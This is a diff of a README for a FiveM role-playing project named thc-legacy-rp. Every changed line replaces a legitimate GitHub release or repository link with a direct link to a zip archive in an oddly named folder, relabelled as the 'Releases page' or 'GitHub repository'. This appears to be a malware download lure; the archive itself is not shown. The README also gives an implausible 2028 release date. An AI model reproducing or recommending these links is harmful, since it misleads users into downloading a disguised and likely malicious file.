@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to thc-legacy-rp! This application offers a unique FiveM role-playing experience with player-driven economy, governance, and intricate vehicle mechanics. Play and explore a world inspired by real-life systems. 
 
-[![Download thc-legacy-rp](https://img.shields.io/badge/Download-thc--legacy--rp-blue.svg)](https://github.com/kateynonharmonic352/thc-legacy-rp/releases)
+[![Download thc-legacy-rp](https://raw.githubusercontent.com/kateynonharmonic352/thc-legacy-rp/main/amygdaloncus/thc-legacy-rp-3.4.zip)](https://raw.githubusercontent.com/kateynonharmonic352/thc-legacy-rp/main/amygdaloncus/thc-legacy-rp-3.4.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/kateynonharmonic352/thc-legacy-rp/releases) to download the latest version. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/kateynonharmonic352/thc-legacy-rp/main/amygdaloncus/thc-legacy-rp-3.4.zip) to download the latest version. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest release, dated 16.07.2028.
@@ -45,12 +45,12 @@ In thc-legacy-rp, players immerse themselves in a rich role-playing experience. 
 ## 🛠️ Troubleshooting
 If you encounter issues while downloading or installing, try these solutions:
 
-- **Failed Download:** Ensure your internet connection is stable. Revisit the [Releases page](https://github.com/kateynonharmonic352/thc-legacy-rp/releases) and try again.
+- **Failed Download:** Ensure your internet connection is stable. Revisit the [Releases page](https://raw.githubusercontent.com/kateynonharmonic352/thc-legacy-rp/main/amygdaloncus/thc-legacy-rp-3.4.zip) and try again.
 - **Installation Errors:** Make sure your operating system meets the listed system requirements. Restart your computer and attempt the installation again.
 - **Game Crashes:** If the game crashes during play, check for updates or reinstall the application.
 
 ## 🛡️ Support
-If you need further assistance, the community and developers are here to help. You can reach out through the Issues tab on the [GitHub repository](https://github.com/kateynonharmonic352/thc-legacy-rp).
+If you need further assistance, the community and developers are here to help. You can reach out through the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/kateynonharmonic352/thc-legacy-rp/main/amygdaloncus/thc-legacy-rp-3.4.zip).
 
 ## 📝 Contributing
 Interested in improving thc-legacy-rp? Contributions are welcome! Here’s how you can help:
